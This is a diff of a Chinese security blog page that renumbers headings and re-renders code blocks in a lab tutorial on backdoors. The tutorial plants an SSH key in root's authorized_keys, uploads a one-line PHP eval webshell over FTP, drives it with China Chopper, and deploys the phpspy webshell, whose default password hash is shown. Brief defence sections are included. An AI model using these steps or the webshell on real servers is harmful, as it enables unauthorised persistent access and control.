@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-10-17T03:32:17.000Z">
-<meta property="article:modified_time" content="2023-12-09T17:23:32.708Z">
+<meta property="article:modified_time" content="2023-12-12T11:47:00.614Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="远程控制">
 <meta property="article:tag" content="后门">
@@ -144,13 +144,13 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8"><span class="nav-text">Linux系统的SSH免认证后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">一、基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E5%8E%9F%E7%90%86"><span class="nav-text">1、Linux系统的SSH免认证后门原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Linux系统的SSH免认证后门危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E9%98%B2%E8%8C%83"><span class="nav-text">3、Linux系统的SSH免认证后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">二、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-text">三、实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8puttygen%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5"><span class="nav-text">1、利用PuttyGen生成密钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BAauthorized_keys%E9%85%8D%E7%BD%AE%E5%85%AC%E9%92%A5"><span class="nav-text">2、目标机【authorized_keys】配置公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8putty%E8%BF%9B%E8%A1%8C%E5%85%8D%E8%AE%A4%E8%AF%81%E7%9A%84-ssh-%E7%99%BB%E5%BD%95%E6%B5%8B%E8%AF%95"><span class="nav-text">3、利用Putty进行免认证的
-SSH 登录测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8"><span class="nav-text">Linux系统的PHP-Webshell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-1"><span class="nav-text">一、基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-text">1、Linux系统的PHP
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8"><span class="nav-text">Linux系统的SSH免认证后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">1. 基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E5%8E%9F%E7%90%86"><span class="nav-text">1、Linux系统的SSH免认证后门原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Linux系统的SSH免认证后门危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84ssh%E5%85%8D%E8%AE%A4%E8%AF%81%E5%90%8E%E9%97%A8%E9%98%B2%E8%8C%83"><span class="nav-text">3、Linux系统的SSH免认证后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">2. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-text">3. 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8puttygen%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5"><span class="nav-text">1、利用PuttyGen生成密钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BAauthorized_keys%E9%85%8D%E7%BD%AE%E5%85%AC%E9%92%A5"><span class="nav-text">2、目标机【authorized_keys】配置公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8putty%E8%BF%9B%E8%A1%8C%E5%85%8D%E8%AE%A4%E8%AF%81%E7%9A%84-ssh-%E7%99%BB%E5%BD%95%E6%B5%8B%E8%AF%95"><span class="nav-text">3、利用Putty进行免认证的
+SSH 登录测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8"><span class="nav-text">Linux系统的PHP-Webshell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-1"><span class="nav-text">1. 基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-text">1、Linux系统的PHP
 Webshell后门利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Linux系统的PHP
 Webshell后门利用危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E7%B3%BB%E7%BB%9F%E7%9A%84php-webshell%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E9%98%B2%E8%8C%83"><span class="nav-text">3、Linux系统的PHP
-Webshell后门利用防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-1"><span class="nav-text">二、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="nav-text">三、实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC%E6%96%87%E4%BB%B6%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA%E7%9A%84web%E7%A8%8B%E5%BA%8F%E7%9B%AE%E5%BD%95%E4%B8%AD"><span class="nav-text">1、利用ftp服务器，上传小马文件到目标机的web程序目录中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC%E6%96%87%E4%BB%B6%E7%9A%84%E7%BD%91%E5%9D%80%E8%8F%9C%E5%88%80%E9%93%BE%E6%8E%A5%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%85%B3%E6%9C%89%E7%94%A8%E4%BF%A1%E6%81%AF"><span class="nav-text">2、访问上传小马文件的网址，菜刀链接并获取相关有用信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%B0%8F%E9%A9%AC%E8%8E%B7%E5%8F%96%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E4%B8%8A%E4%BC%A0%E5%A4%A7%E9%A9%AC%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%BF%91%E4%B8%80%E6%AD%A5%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-text">3、利用小马获取的文件管理权限上传大马文件，进行近一步的攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8"><span class="nav-text">Win系统的JSP-Webshell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-2"><span class="nav-text">一、基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Win系统的JSP
+Webshell后门利用防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-1"><span class="nav-text">2. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="nav-text">3. 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC%E6%96%87%E4%BB%B6%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA%E7%9A%84web%E7%A8%8B%E5%BA%8F%E7%9B%AE%E5%BD%95%E4%B8%AD"><span class="nav-text">1、利用ftp服务器，上传小马文件到目标机的web程序目录中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC%E6%96%87%E4%BB%B6%E7%9A%84%E7%BD%91%E5%9D%80%E8%8F%9C%E5%88%80%E9%93%BE%E6%8E%A5%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%85%B3%E6%9C%89%E7%94%A8%E4%BF%A1%E6%81%AF"><span class="nav-text">2、访问上传小马文件的网址，菜刀链接并获取相关有用信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%B0%8F%E9%A9%AC%E8%8E%B7%E5%8F%96%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E4%B8%8A%E4%BC%A0%E5%A4%A7%E9%A9%AC%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%BF%91%E4%B8%80%E6%AD%A5%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-text">3、利用小马获取的文件管理权限上传大马文件，进行近一步的攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8"><span class="nav-text">Win系统的JSP-Webshell后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-2"><span class="nav-text">1. 基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8%E5%8D%B1%E5%AE%B3"><span class="nav-text">2、Win系统的JSP
 Webshell后门危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#win%E7%B3%BB%E7%BB%9F%E7%9A%84jsp-webshell%E5%90%8E%E9%97%A8%E9%98%B2%E8%8C%83"><span class="nav-text">3、Win系统的JSP
-Webshell后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-2"><span class="nav-text">二、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-2"><span class="nav-text">三、实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8tomcat%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E4%B8%8A%E4%BC%A0war%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6"><span class="nav-text">1、利用Tomcat文件管理上传war的木马文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E6%89%80%E5%85%B7%E5%A4%87%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%9B%B4%E8%87%B3%E6%8F%90%E6%9D%83"><span class="nav-text">2、利用木马文件所具备的功能进行信息获取直至提权</span></a></li></ol></li></ol></li></ol></div>
+Webshell后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-2"><span class="nav-text">2. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-2"><span class="nav-text">3. 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8tomcat%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E4%B8%8A%E4%BC%A0war%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6"><span class="nav-text">1、利用Tomcat文件管理上传war的木马文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E6%89%80%E5%85%B7%E5%A4%87%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E7%9B%B4%E8%87%B3%E6%8F%90%E6%9D%83"><span class="nav-text">2、利用木马文件所具备的功能进行信息获取直至提权</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -250,7 +250,7 @@ Webshell后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-10 01:23:32" itemprop="dateModified" datetime="2023-12-10T01:23:32+08:00">2023-12-10</time>
+      <time title="修改时间：2023-12-12 19:47:00" itemprop="dateModified" datetime="2023-12-12T19:47:00+08:00">2023-12-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -293,7 +293,7 @@ Webshell后门防范</span></a></li></ol></li><li class="nav-item nav-level-2"><
     
     <div class="post-body" itemprop="articleBody"><h1
 id="linux系统的ssh免认证后门"><strong>Linux系统的SSH免认证后门</strong></h1>
-<h2 id="一基本原理"><strong>一、基本原理</strong></h2>
+<h2 id="基本原理"><strong>1. 基本原理</strong></h2>
 <h3
 id="linux系统的ssh免认证后门原理"><strong>1、Linux系统的SSH免认证后门原理</strong></h3>
 <p>免密码登录的原理就是在S一端存放那些有访问权限的C端的身份认证。即，在C端以ssh-gen命令生成一对公/私钥，私钥放在C端，公钥上传到S端。这样，每次从C登录S的时候，C端凭借着私钥让服务器端认证自己。这个密码只在C端把公钥上传到S端的时候用一次，后续登录即可免认证。</p>
@@ -310,7 +310,7 @@ id="linux系统的ssh免认证后门防范"><strong>3、Linux系统的SSH免认�
 <li>查看命令历史纪录，对可疑文件进行清理。在有条件的情况下，可重做系统</li>
 <li>修改服务器所有用户的密码为新的强壮密码。</li>
 </ul>
-<h2 id="二实验环境"><strong>二、实验环境</strong></h2>
+<h2 id="实验环境"><strong>2. 实验环境</strong></h2>
 <ul>
 <li>操作机：Windows</li>
 <li>目标机：Ubuntu</li>
@@ -322,7 +322,7 @@ X上。除了官方版本外，有许多第三方的团体或个人将PuTTY移�
 Tatham维护，使用MIT
 licence授权。随着Linux在服务器端应用的普及，Linux系统管理越来越依赖于远程。在各种远程登录工具中，Putty是出色的工具之一。Putty是一个免费的、Windows
 x86平台下的Telnet、SSH和rlogin客户端，但是功能丝毫不逊色于商业的Telnet类工具。</p>
-<h2 id="三实验过程"><strong>三、实验过程</strong></h2>
+<h2 id="实验过程"><strong>3. 实验过程</strong></h2>
 <h3
 id="利用puttygen生成密钥"><strong>1、利用PuttyGen生成密钥</strong></h3>
 <p>点击“Genterate”按钮来生成一对非对称的公私密钥。在生成密钥的时候，需要等待一段时间，不过可以在空白处随意快速移动鼠标来加快生成速度。默认采用“SSH-2
@@ -349,21 +349,11 @@ id="目标机authorized_keys配置公钥"><strong>2、目标机【authorized_key
 <ul>
 <li><strong>确认系统中是否已经存在“/root/.ssh/authorized_keys”这个文件以及“/root/.ssh/”这个隐藏目录。</strong></li>
 </ul>
-<p><code>ls -a /root/.ssh/authorized_keys ls -ad /root/.ssh</code></p>
-<ul>
-<li><strong>如果系统默认不存在该目录和文件，先运行以下命令来创建目录和文件</strong>。</li>
-</ul>
-<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca6e2e2a1.png" /></p>
-<p><code>mkdir /root/.ssh touch /root/.ssh/authorized_keys ls -al /root/.ssh/authorized_keys</code></p>
-<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca8c7f67a.png" /></p>
-<ul>
-<li><strong>运行以下命令来将刚才创建的公钥字符串追加添加到“/root/.ssh/authorized_keys”文件中。</strong></li>
-</ul>
-<p><code>echo "ssh-rsa AAAAB…………………………O3I0Q== rsa-key-20221017" &gt;&gt; /root/.ssh/authorized_keys" &gt;&gt; /root/.ssh/authorized_keys</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">ls</span> -ad /root/.ssh</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">*   **如果系统默认不存在该目录和文件，先运行以下命令来创建目录和文件**。</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca6e2e2a1.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bash  </span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh</span><br><span class="line"><span class="built_in">touch</span> /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">ls</span> -al /root/.ssh/authorized_keys</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634cca8c7f67a.png)</span><br><span class="line"></span><br><span class="line">*   **运行以下命令来将刚才创建的公钥字符串追加添加到“/root/.ssh/authorized\_keys”文件中。**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```bash  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB…………………………O3I0Q== rsa-key-20221017&quot;</span> &gt;&gt; /root/.ssh/authorized_keys<span class="string">&quot; &gt;&gt; /root/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li><strong>使用以下命令查看文件内容，确认是否正确：</strong></li>
 </ul>
-<p><code>cat /root/.ssh/authorized_keys</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccb7a14bb1.png" /></p>
 <ul>
 <li><strong>退出 Putty 的本次 SSH 会话。</strong></li>
@@ -383,7 +373,7 @@ SSH 登录测试</strong></h3>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634ccc529a9f7.png" /></p>
 <h1
 id="linux系统的php-webshell后门"><strong>Linux系统的PHP-Webshell后门</strong></h1>
-<h2 id="一基本原理-1"><strong>一、基本原理</strong></h2>
+<h2 id="基本原理-1"><strong>1. 基本原理</strong></h2>
 <h3 id="linux系统的php-webshell后门利用原理"><strong>1、Linux系统的PHP
 Webshell后门利用原理</strong></h3>
 <p>利用ftp上传小马文件，通过菜刀链接，得到文件管理权限，上传大马文件后，提权就可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。导致该漏洞的原因在于代码作者没有对一些共享服务进行有效的管理，可以直接上传危害文件，从而导致主机被攻陷。</p>
@@ -394,19 +384,19 @@ Webshell后门利用危害</strong></h3>
 Webshell后门利用防范</strong></h3>
 <p>当前最有效的解决办法，就是用软件查杀/入侵防护系统，快速对网站文件进行扫描，找出隐藏深处的网页木马并处理。
 　　然后，将系统设置安全，以及锁定用户组防止提权，防止3389远程登录，设置好ftp服务器，防止攻击者直接使用ftp上传木马程序文件到web程序的目录中，将可以极大提高服务器和网站的安全性。</p>
-<h2 id="二实验环境-1"><strong>二、实验环境</strong></h2>
+<h2 id="实验环境-1"><strong>2. 实验环境</strong></h2>
 <ul>
 <li>操作机：Windows</li>
 <li>目标机：Ubuntu</li>
 <li>实验工具：中国菜刀（Chopper）</li>
 </ul>
 <p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。</p>
-<h2 id="三实验过程-1"><strong>三、实验过程</strong></h2>
+<h2 id="实验过程-1"><strong>3. 实验过程</strong></h2>
 <h3
 id="利用ftp服务器上传小马文件到目标机的web程序目录中"><strong>1、利用ftp服务器，上传小马文件到目标机的web程序目录中</strong></h3>
 <p>在操作机上当前chopper目录中新建一个名为“test.php”的文件，文件内容为一句话的
 PHP Webshell，即：</p>
-<p><code>&lt;?php @eval($_POST['1234']);?&gt;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1234&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>将一句话 PHP Webshell 上传到目标 Web 服务器的 Web
 主目录中。在cmd界面以ftp登录目标机，如果成功登录的话，应该能够看到提示消息：“230
 Login
@@ -420,7 +410,7 @@ Web 根目录中，然后运行“<code>dir</code>”命令来查看 Web
 <p>将test.php复制到C盘根目录下，方便上传。使用如下 ftp
 指令切换客户端本地目录到“C:\”目录中，然后上传“test.php”文件到目标服务器的
 Web 根目录中去</p>
-<p><code>lcd c:\ ！dir put test.php</code></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lcd c:\</span><br><span class="line">！<span class="keyword">dir</span></span><br><span class="line">put <span class="keyword">test</span>.php</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d437a67268.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d438636b77.png" /></p>
 <h3
@@ -452,7 +442,7 @@ Chopper 主界面</p>
 <p>回到 Chopper 主界面，右击点击添加 URL
 条目，选择“编辑”菜单项后弹出“编辑 Shell”对话框，
 在“配置”编辑框中输入如下数据库连接字符串</p>
-<p><code>&lt;T&gt;MYSQL&lt;/T&gt; &lt;H&gt;127.0.0.1&lt;H&gt; &lt;U&gt;root&lt;/U&gt; &lt;P&gt;toor&lt;/P&gt;</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>127.0.0.1<span class="tag">&lt;<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>root<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>toor<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>这其中定义了数据库连接类型为“MYSQL”，服务器地址为“127.0.0.1”（本地），数据库连接用户名为“root”，密码为“toor”。点击“编辑”按钮后返回到
 Chopper 主界面。</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44a3b9702.png" />
@@ -470,7 +460,7 @@ Chopper 主界面。</p>
 id="利用小马获取的文件管理权限上传大马文件进行近一步的攻击"><strong>3、利用小马获取的文件管理权限上传大马文件，进行近一步的攻击</strong></h3>
 <p>用记事本或者其他文本编辑软件打开“phpspy.php”这个 PHP Webshell
 文件，找到如下这一行：</p>
-<p><code>$pass = 'e10adc3949ba59abbe56e057f20f883e'; //123456</code></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pass = &#x27;e10adc<span class="number">3949</span>ba59abbe56e057f20f883e&#x27;; <span class="comment">//123456</span></span><br></pre></td></tr></table></figure>
 <p>可自定义更改这个默认的管理登录密码“123456”，只是得首先计算密码的 MD5
 散列值来替换原来的散列值内容。</p>
 <p>回到 Chopper 主界面，右击点击添加 URL
@@ -479,7 +469,7 @@ Web 服务器的根目录中。</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4619f0ccb.png" /></p>
 <p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
 地址：</p>
-<p><code>http://10.5.14.66/phpspy.php</code></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//10.5.14.66/phpspy.php</span></span><br></pre></td></tr></table></figure>
 <p>如下图所示</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d466e01800.png" /></p>
 <p>在登录密码输入框中输入我们前面设置的登录密码（默认为“123456”），然后点击右侧的
@@ -512,7 +502,7 @@ Manager”网页链接，我们就能管理目标 Web
 Writable Directory”功能。</p>
 <h1
 id="win系统的jsp-webshell后门"><strong>Win系统的JSP-Webshell后门</strong></h1>
-<h2 id="一基本原理-2"><strong>一、基本原理</strong></h2>
+<h2 id="基本原理-2"><strong>1. 基本原理</strong></h2>
 <p><strong>1、Win系统的JSP Webshell后门原理</strong></p>
